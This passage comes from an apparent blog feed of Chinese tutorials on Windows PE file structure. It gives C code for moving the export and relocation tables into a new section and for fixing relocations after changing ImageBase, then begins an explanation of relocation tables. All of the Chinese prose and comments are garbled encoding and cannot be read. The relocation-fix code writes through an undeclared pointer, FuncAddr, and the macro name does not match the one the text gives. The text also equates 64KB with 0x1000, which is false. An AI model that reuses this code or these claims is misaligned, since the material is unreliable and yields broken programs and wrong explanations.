class="hljs-number">4</span>);<br>    <span class="hljs-comment">//ä¿®æ­£å¯¼å‡ºè¡¨AddressOfFunctionsåœ°å€ï¼Œä½¿å…¶æŒ‡å‘æ–°å‡½æ•°åœ°å€è¡¨ æ³¨æ„æ˜¯RVA è¿™é‡Œå°±æ˜¯æ–°èŠ‚åŒºèµ·å§‹RVA</span><br>    Export_Table-&gt;AddressOfFunctions = New_SectionHeader-&gt;VirtualAddress + index;<br>    <span class="hljs-comment">//è®°å½•å·²ç»copyå¤šå°‘å­—èŠ‚</span><br>    index += Export_Table-&gt;NumberOfFunctions * <span class="hljs-number">4</span>;<br>    <br>    <span class="hljs-comment">//å®šä½åˆ°åºå·è¡¨ï¼ŒåŒç†ä½¿ç”¨char*ç±»å‹æŒ‡é’ˆ</span><br>    <span class="hljs-type">char</span>* AddressOfOrdinals = Buffer + RVA_TO_FOA(Export_Table-&gt;AddressOfNameOrdinals,Buffer);<br><br>    <span class="hljs-comment">//å¤åˆ¶åºå·è¡¨</span><br>    <span class="hljs-built_in">memcpy</span>(New_Sec + index, AddressOfOrdinals, Export_Table-&gt;NumberOfNames * <span class="hljs-number">2</span>);<br>    <span class="hljs-comment">//ä¿®æ­£å¯¼å‡ºè¡¨AddressOfNameOrdinalsï¼Œä½¿å…¶æŒ‡å‘æ–°åºå·è¡¨ï¼Œä¹Ÿæ˜¯RVA</span><br>    Export_Table-&gt;AddressOfNameOrdinals = New_SectionHeader-&gt;VirtualAddress + index;<br>    <span class="hljs-comment">//è®°å½•ç›®å‰æ€»å…±å·²ç»copyå¤šå°‘å­—èŠ‚</span><br>    index += Export_Table-&gt;NumberOfNames * <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">//åç§°è¡¨å®ç°ç¨æ˜¾å¤æ‚ï¼Œå› ä¸ºè¿˜éœ€è¦copyåç§°è¡¨å¯¹åº”çš„åå­—</span><br>    <span class="hljs-comment">//å®šä½åˆ°åç§°è¡¨</span><br>    <span class="hljs-type">char</span>* AddressOfNames = Buffer + RVA_TO_FOA(Export_Table-&gt;AddressOfNames,Buffer);<br>    <span class="hljs-comment">//æ–°èŠ‚ä¸­ åç§°è¡¨èµ·å§‹åœ°å€</span><br>    <span class="hljs-type">char</span>* AddressOfNames_FIX = New_Sec + index;<br>    <span class="hljs-comment">//ä¿®å¤å¯¼å‡ºè¡¨AddressOfNamesï¼Œä½¿å…¶æŒ‡å‘æ–°åç§°è¡¨</span><br>    Export_Table-&gt;AddressOfNames = New_SectionHeader-&gt;VirtualAddress + index;<br>    <br>    <span class="hljs-comment">//æŒ‡å‘åé¢çš„ç©ºç™½åŒºï¼Œå¼€å§‹å¤åˆ¶åå­—</span><br>    index += Export_Table-&gt;NumberOfNames * <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; Export_Table-&gt;NumberOfNames;i++)&#123;<br>        <span class="hljs-comment">//å¤åˆ¶åå­—//AddressOfNamesåœ¨å®šä¹‰æ—¶ä½¿ç”¨çš„char*ç±»å‹ï¼Œè¿™é‡Œå–å€¼éœ€è¦è½¬ä¸ºDWORD*å‹</span><br>        <span class="hljs-type">char</span>* name = Buffer + RVA_TO_FOA(*((DWORD*)AddressOfNames + i),Buffer);<br>        <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br>        <span class="hljs-comment">//+1æ˜¯å› ä¸ºè¦æŠŠå­—ç¬¦ä¸²åé¢çš„0ä¹Ÿå¤åˆ¶è¿‡å»ï¼Œå½“ç„¶ä¸å¤åˆ¶ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºåˆ›å»ºæ–°èŠ‚åŒºæ—¶å°±å·²ç»å…¨éƒ¨åˆå§‹ä¸º0</span><br>        <span class="hljs-built_in">memcpy</span>(New_Sec + index,name,len+<span class="hljs-number">1</span>);<br><span class="hljs-comment">//è¿™é‡Œæ—¶ä¿®å¤åç§°è¡¨è¡¨é¡¹çš„åœ°å€ï¼Œåœ¨æ ¹æ®åŸè¡¨é¡¹æ‰¾åˆ°å¹¶å¤åˆ¶åå­—åå°±è¦æŠŠè¡¨é¡¹ç»™ä¿®æ­£ä¸ºæ–°å¤åˆ¶çš„åœ°å€ï¼Œè¿™é‡Œå°±æ˜¯FOAè½¬RVAäº†</span><br>        *((DWORD*)AddressOfNames_FIX + i) = FOA_TO_RVA((New_Sec + index) - Buffer,Buffer);<br>        <span class="hljs-comment">//è¿™é‡Œå¿…é¡»åŠ 1ï¼Œå› ä¸ºå­—ç¬¦ä¸²ç»“æŸåœ°å€ä¸€å®šä¸º0</span><br>        index += len + <span class="hljs-number">1</span>;<br>    &#125;<br>    <br><span class="hljs-comment">//è¿™é‡Œå¼€å§‹å¤åˆ¶å¯¼å‡ºè¡¨æ•°æ®</span><br>    <span class="hljs-type">int</span> Size_Of_Exportable = <span class="hljs-keyword">sizeof</span>(IMAGE_EXPORT_DIRECTORY);<br>    <span class="hljs-built_in">memcpy</span>(New_Sec + index,Export_Table,Size_Of_Exportable);<br>    <span class="hljs-comment">//è¿™é‡Œå°±æ˜¯ä¿®å¤åŸç›®å½•é¡¹</span><br>    OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress = New_SectionHeader-&gt;VirtualAddress + index;<br>    <br>    Export_Table_INFO(Buffer);<br>    <span class="hljs-keyword">return</span> Buffer;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ç§»åŠ¨é‡å®šä½è¡¨"><a href="#ç§»åŠ¨é‡å®šä½è¡¨" class="headerlink" title="ç§»åŠ¨é‡å®šä½è¡¨"></a>ç§»åŠ¨é‡å®šä½è¡¨</h2><p>é‡å®šä½è¡¨ç»“æ„æ¯”å¯¼å‡ºè¡¨ç»“æ„ç®€å•è®¸å¤šï¼Œåªéœ€è¦æŠŠç›®å½•é¡¹çš„VirtualAddressæŒ‡å‘æ–°èŠ‚åŒºï¼Œå¹¶æŠŠé‡å®šä½è¡¨æ•°æ®copyåˆ°æ–°èŠ‚åŒºå³å¯</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307120116122.png"></p><h3 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Move_RelocTable</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER New_SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br>New_SectionHeader=(PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER +IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>) + FILEHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-comment">//å®šä½åˆ°é‡å®šä½è¡¨</span><br>    DWORD Reloc_RVA = OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>    DWORD Reloc_FOA = RVA_TO_FOA(Reloc_RVA,Buffer); <br>    PIMAGE_BASE_RELOCATION Reloc_Table = (PIMAGE_BASE_RELOCATION)(Buffer + Reloc_FOA);<br><span class="hljs-comment">//è®°å½•æ–°èŠ‚åŒºåç§»</span><br>    DWORD index = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">//ç»“æŸæ ‡å¿—</span><br>    <span class="hljs-keyword">while</span>(Reloc_Table-&gt;VirtualAddress &amp;&amp; Reloc_Table-&gt;SizeOfBlock)&#123;<br>        <span class="hljs-comment">//ç›´æ¥å¤åˆ¶å³å¯</span><br>        <span class="hljs-built_in">memcpy</span>(New_SectionHeader-&gt;PointerToRawData + Buffer + index,Reloc_Table,Reloc_Table-&gt;SizeOfBlock);<br>        <span class="hljs-comment">//è®°å½•å¤åˆ¶äº†å¤šå°‘å­—èŠ‚</span><br>        index += Reloc_Table-&gt;SizeOfBlock;<br>        <span class="hljs-comment">//ç»§ç»­å¤åˆ¶ä¸‹å¼ é‡å®šä½è¡¨</span><br>        Reloc_Table = (PIMAGE_BASE_RELOCATION) (((byte*)(Reloc_Table) + Reloc_Table-&gt;SizeOfBlock));<br>    &#125;<br><span class="hljs-comment">//ä¿®æ­£ç›®å½•é¡¹çš„VirtualAddress</span><br>    OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = New_SectionHeader-&gt;VirtualAddress;<br><br>    <span class="hljs-keyword">return</span> Buffer;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="ä¿®å¤é‡å®šä½è¡¨"><a href="#ä¿®å¤é‡å®šä½è¡¨" class="headerlink" title="ä¿®å¤é‡å®šä½è¡¨"></a>ä¿®å¤é‡å®šä½è¡¨</h2><p>å‰é¢æåŠï¼Œé‡å®šä½è¡¨æ˜¯åœ¨PEæ–‡ä»¶æ— æ³•æŒ‰ç…§è¯­å¥ImageBaseè£…è½½æ—¶å‘æŒ¥ä½œç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰‹åŠ¨æ¥æ”¹ä¸€æ”¹PEæ–‡ä»¶çš„ImageBaseç„¶åè‡ªå·±æ¥ä¿®å¤é‚£äº›åœ°å€ã€‚</p><p>æ¯”å¦‚è¯´ä¸€ä¸ªé‡å®šä½è¡¨çš„VisualAddressæ˜¯0x1000ï¼Œå®ƒå…¶ä¸­ä¸€ä¸ªæ•°æ®é¡¹æœ‰æ•ˆå€¼æ˜¯0x12ï¼Œé‚£ä¹ˆå°±è¯´æ˜RVA0x1012å¤„æœ‰ä¸€ä¸ªéœ€è¦ä¿®å¤çš„åœ°å€ï¼Œéœ€è¦æ ¹æ®å®é™…ImageBaseæ¥é‡æ–°è®¡ç®—ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œä¿®æ”¹äº†ImageBaseï¼Œå°±ç›¸å½“äºæ¨¡æ‹Ÿäº†æ— æ³•æŒ‰ç…§ImageBaseæ¥è£…è½½ï¼Œæˆ‘ä»¬å°±å¾—æŒ‰ç…§é‡å®šä½è¡¨å»æ‰¾é‚£äº›éœ€è¦ä¿®æ”¹çš„åœ°å€ï¼Œæ¥é‡æ–°è®¡ç®—ã€‚æ¯”å¦‚æˆ‘ä»¬ç»™ImageBaseå¢åŠ 0x100000ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„é‚£äº›éœ€è¦ä¿®æ”¹çš„åœ°å€éƒ½ä¸€èµ·å¢åŠ 0x100000</p><p>NOTEï¼šé‡å®šä½è¡¨æ˜¯è®°å½•éœ€è¦ä¿®æ”¹åœ°å€çš„è¡¨ï¼Œå…¶æœ¬èº«æ˜¯ä¸éœ€è¦ä¿®æ”¹çš„ã€‚</p><h3 id="ä»£ç -2"><a href="#ä»£ç -2" class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>INCREATEMENTæ˜¯æˆ‘å®šä¹‰çš„ä¸€ä¸ªå®ï¼Œä½œä¸ºImageBaseä¿®æ”¹çš„å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">Reloc_Fix</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//å®šä½åˆ°é‡å®šä½è¡¨</span><br>DWORD Reloc_RVA = OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>    DWORD Reloc_FOA = RVA_TO_FOA(Reloc_RVA,Buffer);<br>    PIMAGE_BASE_RELOCATION Reloc_Table = (PIMAGE_BASE_RELOCATION)(Buffer + Reloc_FOA);<br>    <span class="hljs-comment">//æ‰‹åŠ¨æ›´æ”¹ImageBase</span><br>    OptionalHeader-&gt;ImageBase =OptionalHeader-&gt;ImageBase + INCREATIMENT;<br><br>    <span class="hljs-keyword">while</span>(Reloc_Table-&gt;VirtualAddress &amp;&amp; Reloc_Table-&gt;SizeOfBlock)&#123;<br>        <span class="hljs-comment">//å®šä½åˆ°é‡å®šä½è¡¨çš„æ•°æ®é¡¹</span><br>        WORD* Reloc_Add = (WORD*)((<span class="hljs-type">char</span>*)Reloc_Table + <span class="hljs-number">8</span>);<br>        <span class="hljs-comment">//æ•°æ®é¡¹é¡¹æ•°</span><br>        DWORD RealSize =( Reloc_Table-&gt;SizeOfBlock - <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; RealSize ; i++)&#123;<br>            <span class="hljs-comment">//æ•°æ®é¡¹ä½12ä½æ˜¯åç§»</span><br>            DWORD Offset = (*(Reloc_Add + i) )&amp; <span class="hljs-number">0x0fff</span>;<br>            <span class="hljs-comment">//VirtualAddressæ˜¯åŸºå€ï¼Œä¸æ•°æ®é¡¹ä½12ä½ä¸€èµ·ç»„æˆåœ°å€</span><br>            DWORD Base = Reloc_Table-&gt;VirtualAddress;<br>            <span class="hljs-comment">//æ‰¾åˆ°éœ€è¦ä¿®æ”¹çš„åœ°å€</span><br>            DWORD* Addr = (DWORD*)(RVA_TO_FOA(Base + Offset,Buffer) + Buffer);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Beferoe: %x &quot;</span>,*Addr);<br>            <span class="hljs-comment">//è¿›è¡Œé‡å®šä½ï¼Œä¹Ÿå°±æ˜¯æ ¹æ®ImageBaseè¿›è¡Œä¿®å¤</span><br>            *FuncAddr =*Addr + INCREATIMENT;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After: %x\n&quot;</span>,*Addr);<br>        &#125;<br><span class="hljs-comment">//ç»§ç»­ä¸‹ä¸€ä¸ªé‡å®šä½è¡¨</span><br>        Reloc_Table =(PIMAGE_BASE_RELOCATION) ((<span class="hljs-type">char</span>*)Reloc_Table + Reloc_Table-&gt;SizeOfBlock);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆå…«ï¼‰</title>
    <link href="/2023/07/09/PE_7/"/>
    <url>/2023/07/09/PE_7/</url>
    
    <content type="html"><![CDATA[<p>é‡å®šä½è¡¨</p><span id="more"></span><h2 id="ç¨‹åºè£…è½½è¿‡ç¨‹"><a href="#ç¨‹åºè£…è½½è¿‡ç¨‹" class="headerlink" title="ç¨‹åºè£…è½½è¿‡ç¨‹"></a>ç¨‹åºè£…è½½è¿‡ç¨‹</h2><p>å½“æˆ‘ä»¬åŒå‡»ä¸€ä¸ªexeçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨ä¸ºè¿™ä¸ªexeåˆ†é…4GBç‹¬ç«‹çš„è™šæ‹Ÿç©ºé—´ï¼Œå…¶ä¸­é«˜2Gä½œä¸ºè¿è¡Œæ“ä½œç³»ç»Ÿå†…æ ¸ä»»åŠ¡ï¼Œä½2Gæ‰è¿è¡Œç”¨æˆ·çš„ä»£ç ã€‚åœ¨æ‹¥æœ‰è¿™ä¸ª4GBç©ºé—´åï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šæŠŠè¿™ä¸ªexeä»æ–‡ä»¶çŠ¶æ€æ‹‰ä¼¸ç„¶åå¤åˆ¶åˆ°ä½2Gç©ºé—´ä¸­</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082336465.png"></p><p>è€Œååˆ™æ˜¯copyç³»ç»ŸDLLåˆ°é«˜2Gä¸­ã€‚æœ€ååˆ™æ˜¯å°†eipç½®ä¸ºEntryPointï¼Œå°±å¯ä»¥è¿è¡Œæ•´ä¸ªexeäº†ã€‚</p><p>ç„¶è€Œè¿™é‡Œé¢æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ¯ä¸ªPEæ–‡ä»¶éƒ½ä¼šä¼˜å…ˆæŒ‰ç…§å…¶è‡ªèº«DLLçš„ImageBaseæ¥è£…è½½ï¼Œé‚£ä¹ˆå°±æ— æ³•é¿å…ImageBaseå†²çªçš„çŠ¶å†µã€‚ä¸€æ—¦å‘ç”ŸImageBaseå†²çªå°±éœ€è¦å¦æ‰¾ä¸€ä¸ªåœ°æ–¹æ¥è£…è½½ã€‚å¯è‹¥ä»…ä»…åªæ˜¯æ¢ä¸€ä¸ªåœ°æ–¹æ¥è£…è½½ï¼Œåˆä¼šå¸¦æ¥å¦ä¸€ä¸ªé—®é¢˜â€”â€”åœ°å€æ”¹å˜ã€‚</p><p>åœ¨ç¼–è¯‘ä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨å¾€å¾€ä¼šæŠŠä¸€äº›å…¨å±€å˜é‡æˆ–è€…å‡½æ•°è°ƒç”¨çš„åœ°å€ç»™å†™æ­»ï¼Œä¹Ÿå°±æ˜¯æŒ‰ç…§é¢„è®¡çš„ImageBaseæ¥è®¡ç®—åœ°å€</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082351108.png"></p><p>æ¯”å¦‚å›¾ä¸­æ‰€æœ‰çš„çº¢ä¸‹åˆ’çº¿éƒ½å¯¹åº”ä¸€ä¸ªåœ°å€ï¼Œä»–ä»¬éƒ½æ˜¯æŒ‰ç…§é¢„è®¡çš„ImageBaseæ¥åŠ è½½è®¡ç®—çš„ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰æŒ‰ç…§ImageBaseåŠ è½½ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°å€å°±ä¸€å®šä¼šæœ‰é—®é¢˜ã€‚</p><p>è§£å†³åŠæ³•å°±æ˜¯è®°å½•è¿™äº›åœ°å€ï¼Œåœ¨å®é™…è¿è¡Œçš„æ—¶å€™æ ¹æ®ImageBaseæ¥ä¿®æ­£è¿™äº›åœ°å€ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¸€å¼ è¡¨æ¥è®°å½•è¿™äº›éœ€è¦ä¿®æ­£çš„åœ°å€ã€‚è¿™å¼ è¡¨å°±å«åšé‡å®šä½è¡¨ã€‚</p><h2 id="é‡å®šä½è¡¨"><a href="#é‡å®šä½è¡¨" class="headerlink" title="é‡å®šä½è¡¨"></a>é‡å®šä½è¡¨</h2><h3 id="æ‰¾åˆ°é‡å®šä½è¡¨"><a href="#æ‰¾åˆ°é‡å®šä½è¡¨" class="headerlink" title="æ‰¾åˆ°é‡å®šä½è¡¨"></a>æ‰¾åˆ°é‡å®šä½è¡¨</h3><p>é‡å®šä½è¡¨åœ°å€ä½äºOptionalHeaderçš„ç¬¬å…­é¡¹ï¼Œè¿™ä¸ªåœ°å€ä¹Ÿæ˜¯RVAï¼Œå°†å…¶è½¬åŒ–ä¸ºFOAåå°±å¯ä»¥æ‰¾åˆ°é‡å®šä½è¡¨</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082358679.png"></p><h3 id="é‡å®šä½è¡¨ç»“æ„"><a href="#é‡å®šä½è¡¨ç»“æ„" class="headerlink" title="é‡å®šä½è¡¨ç»“æ„"></a>é‡å®šä½è¡¨ç»“æ„</h3><p>é‡å®šä½è¡¨ä¸å…¶ä»–è¡¨éƒ½æœ‰ä¸åŒï¼Œå®ƒçš„ç»“æ„ä½“åªæœ‰ä¸¤ä¸ªæˆå‘˜ï¼Œä¸€ä¸ªè®°å½•åŸºåœ°å€ï¼Œä¸€ä¸ªè®°å½•å—å¤§å°ï¼Œæ¯ä¸ªç»“æ„ä½“åéƒ½è·Ÿæœ‰è®¸å¤šä¸ªä¸¤å­—èŠ‚æ•°æ®ï¼Œç„¶åè®¸å¤šä¸ªè¿™æ ·çš„å—ç´§å¯†è¿åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªé‡å®šä½è¡¨ã€‚å¯èƒ½ä½ ä¼šé—®åŸºåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿå—å¤§å°æ˜¯ä»€ä¹ˆï¼Ÿæ•°æ®åˆæ˜¯ä»€ä¹ˆï¼Ÿä¸‹é¢å°±æ¥è§£é‡Šæ¯ä¸ªæˆå‘˜çš„æ„ä¹‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_BASE_RELOCATION</span>&#123;</span><br>DWORD VirtualAddress;<br>DWORD SizeOfBlock;<br>    <span class="hljs-comment">//ä¸€å †æ•°æ®...ï¼ˆå¦‚æœæ˜¯æœ€åä¸€ä¸ªè¿™ç§ç»“æ„ï¼Œå°±åªæœ‰RVAå’ŒSizeOfBlockï¼Œä¸”éƒ½ä¸º0ï¼‰</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307090001337.png"></p><p>å¯ä»¥è¿™ä¹ˆç†è§£ï¼šä¸€ä¸ªé‡å®šä½è¡¨ä¸­å¯èƒ½ä¼šæœ‰å¤šä¸ªâ€œå—â€ï¼Œæ¯ä¸ªå—çš„ç»“æ„éƒ½æ˜¯</p><ul><li>4å­—èŠ‚VirtualAddress</li><li>æ¥ç€4å­—èŠ‚SizeOfBlock</li><li>æœ€åæ˜¯ä¸€å †æ•°æ®ï¼Œç§°å…¶ä¸ºå…·ä½“é¡¹</li><li>æ¯ä¸ªå—çš„å¤§å°ä¸ºSizeOfBlockï¼ˆå­—èŠ‚ï¼‰ã€‚</li></ul><p>æœ€åä¸€ä¸ªå—çš„RVAå’ŒSizeOfBlockéƒ½æ˜¯0x00000000ï¼Œè¡¨ç¤ºé‡å®šä½è¡¨ç»“æŸ</p><p>åœ¨ä¸€ä¸ªexeä¸­ï¼Œéœ€è¦é‡å®šä½çš„åœ°å€å¯èƒ½æœ‰å¾ˆå¤šä¸ªï¼Œæ¯ä¸ªåœ°å€éƒ½æ˜¯4å­—èŠ‚ï¼Œå¦‚æœå…¨éƒ¨éƒ½å®Œå®Œå…¨å…¨æŒ‰ç…§4å­—èŠ‚æ¥å­˜å‚¨ï¼Œæ˜¾ç„¶ä¼šå æ®å¾ˆå¤šç©ºé—´ã€‚ä½†æ˜¯ç¨å¾®è§‚å¯Ÿä¸€ä¸‹ä¼šå‘ç°ï¼Œè®¸å¤šéœ€è¦é‡å®šä½çš„åœ°å€éƒ½æ¯”è¾ƒç›¸è¿‘ï¼Œæ¯”å¦‚ä¸Šé¢æ‰€ä¸¾çš„ä¾‹å­ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307082351108.png"></p><p>åœ¨å›¾ä¸­éœ€è¦é‡å®šä½çš„åœ°å€å°±æ˜¯ <code>6DF03</code>,<code>6DF0B</code>,<code>6DF1A</code>ç­‰ç­‰ï¼ˆæ³¨æ„æ˜¯éœ€è¦é‡å®šä½çš„åœ°å€ï¼Œæ“ä½œç æ˜¯ä¸éœ€è¦æ”¹å˜çš„ï¼‰ï¼Œå®ƒä»¬éƒ½æ˜¯<code>6D</code>å¼€å¤´ï¼Œå°±ä¼šå¾ˆè‡ªç„¶è¯ç”Ÿä¸€ç§æƒ³æ³•å°±æ˜¯ä»¥<code>6D000</code>ä¸ºåŸºåœ°å€ï¼Œåœ¨åŸºåœ°å€ä¸ŠåŠ ä¸€ä¸ªåç§»æ¥æ‰¾åˆ°å…·ä½“çš„éœ€è¦é‡å®šä½çš„åœ°å€ã€‚é‚£ä¹ˆè¿™ä¸ªåŸºåœ°å€å°±æ˜¯<code>VirtualAddres</code>ï¼Œåç§»åˆ™è®°å½•åœ¨ç»“æ„ä½“åçš„æ•°æ®ä¸­ï¼Œä¹Ÿå°±æ˜¯é‚£äº›ä¸ª01æ•°æ®ã€‚</p><p>ç°åœ¨æ¥æ€è€ƒè¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œé‚£äº›è®°å½•åç§»çš„01æ•°æ®éƒ½æ˜¯ä¸¤å­—èŠ‚çš„ï¼Œä¹Ÿå°±æ˜¯16ä½ï¼Œèƒ½å¤Ÿè®°å½• $2^{16} &#x3D; 65536$ ä¸ªæ•°æ®ï¼Œç„¶è€Œåœ¨å†…å­˜ä¸­è¿™äº›æ¨¡å—é—´å¯¹é½ç²’åº¦éƒ½æ˜¯64KBå³0x1000ï¼Œä¹Ÿå°±æ˜¯æ‰€æœ‰çš„åŸºåœ°å€éƒ½æ˜¯ä»¥0x1000æ¥å¯¹é½çš„ã€‚16ä½çš„åç§»æ˜¾ç„¶è¶…è¿‡äº†è¿™ä¸ªåŸºåœ°å€ï¼Œåªéœ€è¦ç”¨åˆ°12ä½å°±è¶³ä»¥è¡¨ç¤ºä¸€ä¸ªåŸºåœ°å€çš„æ‰€æœ‰åç§»äº†ã€‚å› 